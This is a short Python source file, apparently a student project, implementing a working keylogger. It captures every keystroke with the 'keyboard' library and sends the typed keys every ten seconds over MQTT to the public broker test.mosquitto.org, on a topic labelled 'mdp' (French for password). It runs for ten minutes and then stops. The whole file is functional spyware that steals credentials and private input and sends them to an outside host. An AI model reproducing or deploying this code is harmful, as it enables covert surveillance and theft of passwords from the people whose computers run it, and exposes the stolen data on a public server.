import time
from threading import Timer

import keyboard
import paho.mqtt.client as mqtt

SEND_LOG_EVERY = 10

class Keylogger:
    def __init__(self):
        self.keystrokes = []
        self.file = f"log_{time.time()}.txt"
        self.pressed = {}
        self.run = True
        self.client = mqtt.Client()
        self.client.connect("test.mosquitto.org", 1883)
#

    def write_to_file(self):
        keys = ""

        for key, event_type in self.keystrokes:
            if event_type == "down":
                keys += key + ' '
        self.client.publish("test/projet/keylogger/mdp", keys)

    def log(self):
        if self.keystrokes and not any(self.pressed.values()):
            self.write_to_file()
            self.keystrokes = []
        timer = Timer(interval=SEND_LOG_EVERY, function=self.log)
        timer.daemon = True
        timer.start()

    def kill(self):
        self.run = False

    def start(self):
        self.log()
        timer_kill_process = Timer(interval=10*60, function=self.kill)
        timer_kill_process.daemon = True
        timer_kill_process.start()
        while self.run:
            event = keyboard.read_event()
            self.keystrokes.append((event.name, event.event_type))
            self.pressed[event.scan_code] = event.event_type == "down"


if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
